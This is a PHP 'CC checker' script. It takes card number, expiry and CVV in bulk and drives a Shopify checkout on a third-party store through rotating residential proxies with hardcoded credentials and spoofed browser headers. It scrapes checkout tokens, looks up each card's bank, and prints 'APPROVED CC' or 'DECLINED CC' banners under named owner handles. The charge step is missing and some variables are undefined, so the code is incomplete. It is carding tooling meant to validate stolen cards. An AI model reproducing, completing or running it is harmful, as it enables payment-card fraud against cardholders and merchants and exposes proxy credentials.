<?php
session_start();
// Turn off output buffering
@ob_end_flush();
@ini_set('output_buffering', 'off');
@ini_set('zlib.output_compression', false);
@ini_set('implicit_flush', true);
while (ob_get_level()) ob_end_clean();
ob_implicit_flush(true);

require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

// Important functions start
function find_between($content, $start, $end) {
    $startPos = strpos($content, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($content, $startPos, $endPos - $startPos);
}

$proxy_list_str = '
proxy.geonode.io:9000:geonode_bGyg00m4jK-type-residential:fb5dd8fc-181d-46d9-bc73-0c4c0cc4b1d3
142.147.128.93:6593:znkruahs:qji8izehszsr
23.95.150.145:6114:znkruahs:qji8izehszsr
198.23.239.134:6540:znkruahs:qji8izehszsr
45.38.107.97:6014:znkruahs:qji8izehszsr
207.244.217.165:6712:znkruahs:qji8izehszsr
107.172.163.27:6543:znkruahs:qji8izehszsr
216.10.27.159:6837:znkruahs:qji8izehszsr
136.0.207.84:6661:znkruahs:qji8izehszsr
104.222.161.211:6343:znkruahs:qji8izehszsr
64.137.96.74:6641:znkruahs:qji8izehszsr';

$proxies = explode("\n", $proxy_list_str);
$proxy_array = [];

foreach ($proxies as $proxy_line) {
    $proxy_line = trim($proxy_line);
    if (empty($proxy_line)) continue;
    $parts = explode(':', $proxy_line);
    $ip = $parts[0] ?? '';
    $port = $parts[1] ?? '';
    $username = $parts[2] ?? '';
    $password = $parts[3] ?? '';

    $proxy_array[] = [
        'ip' => $ip,
        'port' => $port,
        'username' => $username,
        'password' => $password,
    ];
}

// Handle GET request
if (isset($_GET['lista'])) {
    $cc_line = $_GET['lista'];
    $cc1 = trim($cc_line);
    
    if (empty($cc1)) {
        echo json_encode([
            'Error' => 'True',
            'Message' => 'Please enter card details',
            'Owner' => '⚡⚡ @mhitzxg ⚡⚡',
        ]);
        exit;
    }

    $cc_partes = explode("|", $cc1);
    $cc = $cc_partes[0];
    $month = $cc_partes[1];
    $year = $cc_partes[2];
    $cvv = $cc_partes[3];
        /*=====  sub_month  ======*/
    $yearcont = strlen($year);
    if ($yearcont <= 2) {
        $year = "20$year";
    }

    $sub_month = ltrim($month, '0');

    if ($sub_month == "") {
        $sub_month = $month;
    }

    // The variables that may be uninitialized
    $err = '';
    $response = '';
    $checkouturl = '';
    $headers = [];
    $x_checkout_one_session_token = '';
    $queue_token = '';
    $stable_id = '';
    $paymentMethodIdentifier = '';
    $cctoken = '';
    $recipt_id = '';

    $urlbase = 'https://blackmp.life/';
    $domain = 'blackmp.life';
    $cookie = 'cookie.txt';
    
    $proxy = $proxy_array[array_rand($proxy_array)];

    // Start of try-catch to handle exceptions
    try {
        // First cURL request
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/42721297924198:1');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'priority: u=0, i',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: '.$ua,
        ]);
        
        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

        $headers = [];
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
            $parts = explode(':', $headerLine, 2);
            if (count($parts) < 2) return strlen($headerLine);
            $name = trim($parts[0]);
            $value = trim($parts[1]);

            // Save the 'Location' header
            if (strtolower($name) === 'location') {
                $headers['Location'] = $value;
            }

            return strlen($headerLine);
        });
        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            throw new Exception($err);
        }
        if (preg_match('/out of stock/i', $response)) {
            $err = 'Product is out of stock';
            curl_close($ch);
            throw new Exception($err);
        }
        curl_close($ch);

        $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
        $checkoutToken = '';
        if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
            $checkoutToken = $matches[1];
        }
        $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
        if (empty($x_checkout_one_session_token)) {
            $err = "Session token is empty";
            throw new Exception($err);
        }
        $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
        if (empty($queue_token)) {
            $err = 'Queue Token is empty';
            throw new Exception($err);
        }
        $stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
        if (empty($stable_id)) {
            $err = 'Stable id is empty';
            throw new Exception($err);
        }
        $paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
        if (empty($paymentMethodIdentifier)) {
            $err = 'Payment Method Identifier Token is empty';
            throw new Exception($err);
        }
                // ▶️ BIN lookup
        $bin = substr($cc, 0, 6);

        // 🧠 First try binlist.net
        $bininfo = @json_decode(file_get_contents("https://lookup.binlist.net/{$bin}"), true);

        // 🔁 Fallback to antipublic if binlist fails or rate-limited
        if (!$bininfo || !isset($bininfo['bank'])) {
            $bininfo = @json_decode(file_get_contents("https://bins.antipublic.cc/bins/{$bin}"), true);
            $bank = $bininfo['data']['bank'] ?? 'Unavailable';
            $country = $bininfo['data']['country'] ?? 'Unknown';
            $brand = $bininfo['data']['vendor'] ?? 'Unknown';
            $type = $bininfo['data']['type'] ?? 'Unknown';
        } else {
            $bank = $bininfo['bank']['name'] ?? 'Unavailable';
            $country = $bininfo['country']['name'] ?? 'Unknown';
            $brand = $bininfo['scheme'] ?? 'Unknown';
            $type = $bininfo['type'] ?? 'Unknown';
        }

        // ▶️ Status logic
        if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, 'Order') !== false) {
            $status = "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂";
        } else {
            $status = "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 𝐂𝐂";
        }

        $gate = "🛒 𝐆𝐀𝐓𝐄𝐖𝐀𝐘 ↯ Stripe + Shopify $13.98 (Graphql) Charge";

        $fullmsg  = "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
        $fullmsg .= "💥 {$gate}\n";
        $fullmsg .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $fullmsg .= "{$status}\n\n";
        $fullmsg .= "💳 𝐂𝐀𝐑𝐃   ↯ {$cc}|{$sub_month}|{$year}|{$cvv}\n";
        $fullmsg .= "📩 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ↯ {$err}\n\n";
            
        $fullmsg .= "🏦 𝐁𝐀𝐍𝐊   ↯ {$bank} - {$brand} - {$type}\n";
        $fullmsg .= "🌎 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ↯ {$country}\n";
        $fullmsg .= "🕒 𝐓𝐈𝐌𝐄   ↯ " . date('Y-m-d H:i:s') . "\n";
        $fullmsg .= "⏱️ 𝐒𝐏𝐄𝐄𝐃  ↯ {$time_taken}s\n";

        $fullmsg .= "👑 𝐎𝐖𝐍𝐄𝐑 ↯ @mhitzxg | @pr0xy_xd\n";
        $fullmsg .= "┗━━━━━━━━━━━━━━━━━━━━━━━┛";

        echo $fullmsg;
        exit;
    } catch(Exception $e) {
        if (empty($err)) {
            $err = $e->getMessage();
        }
        echo "❌ Error: " . $err;
        exit;
    }
}

// [Rest of your original form processing code remains unchanged...]
// Display the input form for CC
if (!isset($_POST['cc_input'])) {
    echo '
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap");
        body {
            font-family: "Poppins", sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 2.5rem;
            color: #333;
            margin-bottom: 1.5rem;
        }
        textarea {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 2px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            border-color: #4CAF50;
            outline: none;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.1s ease;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        input[type="submit"]:active {
            transform: scale(0.98);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        .error {
            color: red;
            margin-top: 1rem;
        }
    </style>
    <div class="container fade-in">
        <h1>Mod By Goku</h1>
        <form method="post">
            <textarea name="cc_input" rows="10" cols="50" placeholder="Enter CC details (max 10 cards, one per line)"></textarea><br>
            <input type="submit" value="Start Checking">
        </form>
    </div>';
    exit;
}

// [Rest of your original POST processing code...]
?>
